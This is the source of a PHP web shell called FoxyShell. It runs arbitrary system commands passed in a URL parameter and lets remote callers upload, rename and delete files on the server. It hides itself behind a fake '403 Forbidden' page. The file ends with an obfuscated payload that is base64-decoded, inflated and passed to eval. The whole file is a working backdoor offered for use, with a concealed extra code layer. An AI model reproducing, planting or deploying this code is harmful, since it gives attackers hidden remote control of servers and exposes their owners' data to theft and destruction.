<?php

/*   _____________________________________________________________________
    |                        HiddenFoxy Signature                         |
    |                      FoxyShell - FoxyWebShell                       |
    |    GitHub: https://github.com/rubahilang/FoxyShell-PHP-Web-Shell    |
    |_____________________________________________________________________|
*/

set_time_limit(0);
error_reporting(0);

header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') exit;


$default = __DIR__; 
$cwd = $default;
if (isset($_REQUEST['cwd'])) {
    $requested = $_REQUEST['cwd'];
    if (is_dir($requested)) {
        $cwd = realpath($requested);
    }
}
chdir($cwd);

function echo_with_cwd($out) {
    $path = getcwd();
    echo rtrim($out, "\r\n") . "\n\n" . $path;
    exit;
}

if (isset($_GET['foxy'])) {
    $cmd = $_GET['foxy'];

    if (preg_match('/^\s*cd\s+(.+)$/', $cmd, $m)) {
        $target = $m[1];
        if ($target[0] !== '/') {
            $target = $cwd . DIRECTORY_SEPARATOR . $target;
        }
        if (is_dir($target)) {
            chdir($target);
            echo_with_cwd('');
        } else {
            echo_with_cwd("cd: no such directory: {$m[1]}");
        }
    }

    $descriptors = @popen($cmd . ' 2>&1', 'r');
    if (!$descriptors) {
        echo_with_cwd("[!] popen failed");
    }
    $out = '';
    while (!feof($descriptors)) {
        $out .= fgets($descriptors);
    }
    pclose($descriptors);
    echo_with_cwd($out);
}

if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_FILES['file'])) {
    $filename = basename($_FILES['file']['name']);
    $target = $cwd . DIRECTORY_SEPARATOR . $filename;
    header('Content-Type: text/plain; charset=UTF-8');
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        echo "Uploaded to: {$target}";
    } else {
        http_response_code(500);
        echo "Upload failed";
    }
    exit;
}

if (isset($_REQUEST['old'], $_REQUEST['new'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $old = $cwd . DIRECTORY_SEPARATOR . $_REQUEST['old'];
    $new = $cwd . DIRECTORY_SEPARATOR . $_REQUEST['new'];
    if (rename($old, $new)) {
        echo "Renamed '{$_REQUEST['old']}' → '{$_REQUEST['new']}'";
    } else {
        http_response_code(500);
        echo "Rename failed";
    }
    exit;
}

if (isset($_REQUEST['file'])) {
    header('Content-Type: text/plain; charset=UTF-8');
    $f = $cwd . DIRECTORY_SEPARATOR . $_REQUEST['file'];
    if (unlink($f)) {
        echo "Deleted '{$_REQUEST['file']}'";
    } else {
        http_response_code(500);
        echo "Delete failed";
    }
    exit;
}

http_response_code(403);
header('Content-Type: text/html; charset=UTF-8');
echo '<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>403 Forbidden</title>
<style>::selection{color:orange;}</style>
</head><body>
<h1>403 Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
</body></html>';

/*   _____________________________________________________________________
    |                        HiddenFoxy Signature                         |
    |                      FoxyShell - FoxyWebShell                       |
    |    GitHub: https://github.com/rubahilang/FoxyShell-PHP-Web-Shell    |
    |_____________________________________________________________________|
*/

$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
$Lix = "hSgyqMmKmhwLgH+1Fj8bmX6qw0hnT1fkWVDk0+14zmp5/BR0+DNptS06quuC1AoWmjCTzQsrvXxZUH/qqcZqOf3FnxiBsoWAZWesKbBpaosxiyHTmHtVM9Ld19c0X3KE8DEfRVkpQPUBgpX7DllR0K7FGV6y7iB4O8vcWjZKjjwezKX8k4NNT6AMhMP9wdar5XHtodCuTRZ0Mk6Ga+ndD7JNK0z6hNjEWVh0IhsRZia1RiqE0OzfYH+dc6vxCS+RPvFbs4hG08sUU5FjKLdSPVG7poZSOTGy4+ZySZ1cthlrIan3bYIp6iSByuLkX5GWYEVJqJy52+PIzJ0stfWjT49g5cIPCwOxX0itMPO5S1O3UXz4JtFjFPTkwBtVGXBqRGVRgx+FpszhjNR2uE+p/6gKPgvtayDfxlIJOG9j3bxdzDD6K6eaWdEIogpXKE/paK3x+rlAnBSbKJVFe7wG/ezH77GCBbQ3soOMW8xZN3MyofmQxZ0342P0v8lX8h7AGSw0TTOT5M/VKcL/1U/wtn/N2lsJ8o5/YcE+C/u33sIzjinrwPHcMi7dYgjeDCT10agWGnHo7fE3KwYae1AZs24KUpBwzhFK4+NABdQDShaW+h+954sjWuEYU3BZaa3V+9jQQnkZSu9Fa3qiIYsHef8MLCSaxJkFdla9HKOysh2Qu9B5P0HFwstaRLVfciX/0LwCBwJe9nuAWEQ/kLwGB0/3CASA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
exit;

?>
